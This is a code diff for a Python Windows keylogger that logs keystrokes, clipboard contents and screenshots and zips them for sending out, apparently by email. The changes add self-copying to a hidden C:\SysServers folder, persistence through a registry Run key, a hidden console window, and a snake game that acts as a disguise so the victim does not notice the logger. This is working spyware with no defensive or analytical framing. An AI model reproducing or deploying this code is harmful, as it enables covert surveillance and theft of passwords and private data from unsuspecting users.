@@ -1,7 +1,7 @@
 # set PYTHONIOENCODING=UTF-8
-# pyinstaller -F key.py
+# pyinstaller -F -w system.py
 
-import pyHook, pythoncom, sys, win32api, os, time
+import pyHook, pythoncom, sys, win32api, win32con, os, time
 import win32clipboard, zipfile
 from PIL import ImageGrab
 import shutil, getpass
@@ -10,6 +10,8 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+from snake import start_game
+
 
 addr = sys.path[0] + '\\log.txt'
 pic_path = sys.path[0] + '\\pic'
@@ -17,7 +19,6 @@ curr_window = ''
 counter = 0
 zip_path = sys.path[0] + '\\secret.zip'
 log = open(addr, 'a+')
-print(addr)
 
 def before_send_after():
     # Before
@@ -104,9 +105,34 @@ def KBevent(event):
         shutil.rmtree(pic_path)
         win32api.PostQuitMessage()
     return True
+
+
+# Back itself up to the system disk
+if not os.path.exists('C:\\SysServers'):
+    os.makedirs('C:\\SysServers')
+if not os.path.exists('C:\\SysServers\\system.exe'):
+    shutil.copy('system.exe', 'C:\\SysServers')
+
+# Add it to Windows Startup
+name = 'SysServers'
+path = 'C:\\SysServers\\system.exe'
+KeyName = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
+key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, KeyName, 0, win32con.KEY_ALL_ACCESS)
+win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, path)
+# win32api.RegDeleteValue(key, name)
+win32api.RegCloseKey(key)
+
+# Run game as disguise
+if os.getcwd() != 'C:\SysServers':
+    # After Game Over, it will exacute the Keylogger in Backup
+    start_game()
     
-hooks_manager = pyHook.HookManager()
-hooks_manager.KeyDown = KBevent
-hooks_manager.HookKeyboard()
-pythoncom.PumpMessages()
+
+# Begin the Keylogger if it's in the Backup
+if os.getcwd() == 'C:\SysServers':
+    hooks_manager = pyHook.HookManager()
+    hooks_manager.KeyDown = KBevent
+    hooks_manager.HookKeyboard()
+    pythoncom.PumpMessages()
+
 
